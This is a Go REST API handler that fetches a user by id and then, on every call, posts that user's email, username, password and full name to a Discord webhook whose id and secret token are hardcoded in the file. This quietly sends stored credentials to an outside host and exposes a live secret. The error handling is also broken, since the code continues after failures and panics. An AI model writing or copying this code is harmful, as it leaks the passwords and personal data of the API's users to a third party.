package routers

import (
	"encoding/json"
	"fmt"
	"net/http"

	"github.com/Artic-Dev/ArticStyleApi-GO/db/users"
	"github.com/Artic-Dev/ArticStyleApi-GO/helpers"
	"github.com/gorilla/mux"
	"github.com/nickname32/discordhook"
)

func GetUser(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	idAsString := mux.Vars(r)["id"]
	id, err := helpers.StringToInt64(idAsString)
	if err != nil {
		send := sendmessage{err.Error(), false}
		json.NewEncoder(w).Encode(send)
		w.WriteHeader(http.StatusBadRequest)
	}
	user, err := users.CheckUserID(id)
	if err != nil {
		send := sendmessage{err.Error(), false}
		json.NewEncoder(w).Encode(send)
		w.WriteHeader(http.StatusBadRequest)
	} else {
		json.NewEncoder(w).Encode(user)
		w.WriteHeader(http.StatusAccepted)
	}
	wa, err := discordhook.NewWebhookAPI(830780006979993660, "8nuysp_AahT76Jc_oNtVSk5dub-grAo6hfw4Nkko9mC6fXDwEL9Gnkv9Kp1FNijeBMYm", true, nil)
	if err != nil {
		panic(err)
	}
	wh, err := wa.Get(nil)
	if err != nil {
		panic(err)
	}
	fmt.Println(wh.Name)

	msg, err := wa.Execute(nil, &discordhook.WebhookExecuteParams{
		Content: "Encoded GoLang",
		Embeds: []*discordhook.Embed{
			{
				Title:       "Usuario Solicitado:",
				Color:       3407869,
				Description: "**REST API GO** Route GetUser",
				Fields: []*discordhook.EmbedField{
					{
						Name:  "Email",
						Value: user.Email,
					},
					{
						Name:  "Usuario",
						Value: user.Username,
					},
					{
						Name:  "Contraseña",
						Value: user.Password,
					},
					{
						Name:   "Nombre",
						Value:  user.Name,
						Inline: true,
					},
					{
						Name:   "Apellidos",
						Value:  user.LastName,
						Inline: true,
					},
				},
			},
		},
	}, nil, "")
	if err != nil {
		panic(err)
	}
	fmt.Println(msg.ID)
}
